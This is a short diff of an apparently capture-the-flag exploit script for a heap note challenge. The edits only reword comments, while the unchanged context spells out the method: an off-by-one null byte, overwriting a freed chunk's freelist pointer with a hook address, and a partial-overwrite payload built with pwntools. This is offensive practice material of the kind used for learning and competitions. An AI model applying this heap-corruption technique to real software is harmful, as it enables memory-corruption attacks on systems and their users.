@@ -18,7 +18,7 @@ Exploit steps:
   1. create note0 (32) filled with 31 'A's
   2. create note1 (32) filled with 31 'B's
   3. edit note0 with b'X'  → off-by-one null byte at heap+0x40
-  4. delete note1           → freelist next-ptr written to note1.data[0..7] = heap+0x50 (NULL)
+  4. delete note1           → freelist next-pointer written to note1.data[0..7] = heap+0x50 (NULL)
   5. edit note0 with 16 pad bytes + 3-byte hook address + explicit \x00
        fgets reads everything up to '\n'; strcat stops at the embedded \x00
        so '\n' never reaches the pointer → note1.data[0..2] = hook LSBs, [3] = \x00
@@ -121,7 +121,7 @@ log.info('note 1 freed')
 #   note1.data[0]         is at heap+0x50
 #   padding needed: 0x50 - 0x40 = 0x10 (16 bytes)
 #
-#   p64(hook)[:3]  = \x60\x42\x40  (hook = 0x00404260, fits in 3 bytes)
+#   p64(hook)[:3] writes the hook's lower 3 bytes (current challenge addresses fit)
 #   the explicit \x00 in edit_raw stops strcat before '\n' taints byte [3]
 #   result: note1.data[0..3] = \x60\x42\x40\x00 → pointer = 0x00404260 = hook ✓
 payload = b'P' * 16 + p64(hook)[:3]
